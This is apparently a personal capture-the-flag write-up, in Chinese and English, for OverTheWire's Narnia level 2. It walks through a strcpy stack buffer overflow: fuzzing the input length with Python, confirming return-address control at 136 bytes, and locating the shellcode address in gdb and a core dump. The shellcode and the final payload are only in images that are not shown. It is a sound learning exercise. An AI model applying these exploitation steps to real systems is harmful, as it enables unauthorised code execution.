# 1. narnia - level 2

##  - source code

![image-20210816210353564](/Users/wanghui/workspace/git_repos/hack_my_life/over_the_wire/narnia/img/image-20210816210353564.png)

string buffer overflow

##  - assemble code & 2 breakpoints(before & after strcpy)

![image-20210816211553153](/Users/wanghui/workspace/git_repos/hack_my_life/over_the_wire/narnia/img/image-20210816211553153.png)

strcpy前后的两个断点，可以查看strcpy前后，buffer的变化情况，从而获取程序return address。

核心思路：通过注入shellcode、并将程序的下一条程序修改为注入“shellcode”的地址，从而实现hack

##  - explor the memory

=======================================================

`/narnia/narnia2 $(python -c 'print "A" * 132 ') `

`Program received signal SIGSEGV, Segmentation fault. `

`0xf7e2a202 in __libc_start_main () from /lib32/libc.so.6 `

=======================================================

`Starting program: /narnia/narnia2 $(python -c 'print "A" * 136 ') `

`Program received signal SIGSEGV, Segmentation fault.`

`0x41414141 in ?? ()`

=======================================================

结论：136 bytes 将溢出buffer，且最后4个byte将覆盖返回地址，即下一步执行程序

##  - locate buffer address

![image-20210816214855764](/Users/wanghui/workspace/git_repos/hack_my_life/over_the_wire/narnia/img/image-20210816214855764.png)

### 1. Address in GDB

因为FFFFD568地址保存了shellcode，所以该地址需要体现在注入的136个字节中的最后4个

但由于上述地址是在gdb中执行，内存地址会发生变化，所以需要通过在tmp目录下，分析coredump，得到实际运行时的地址

### 2. Address in actual env.

![image-20210816212856449](/Users/wanghui/workspace/git_repos/hack_my_life/over_the_wire/narnia/img/image-20210816212856449.png)

![image-20210816220842077](/Users/wanghui/workspace/git_repos/hack_my_life/over_the_wire/narnia/img/image-20210816220842077.png)

copy 可执行文件到tmp，确保文件名长度一致

`gdb narnia01234567 core`

查看 fffdd568 附近的内容，可以发现新的地址为  ffffd578

![image-20210816221044676](/Users/wanghui/workspace/git_repos/hack_my_life/over_the_wire/narnia/img/image-20210816221044676.png)

##  - Go Go Go

![image-20210816221326719](/Users/wanghui/workspace/git_repos/hack_my_life/over_the_wire/narnia/img/image-20210816221326719.png)

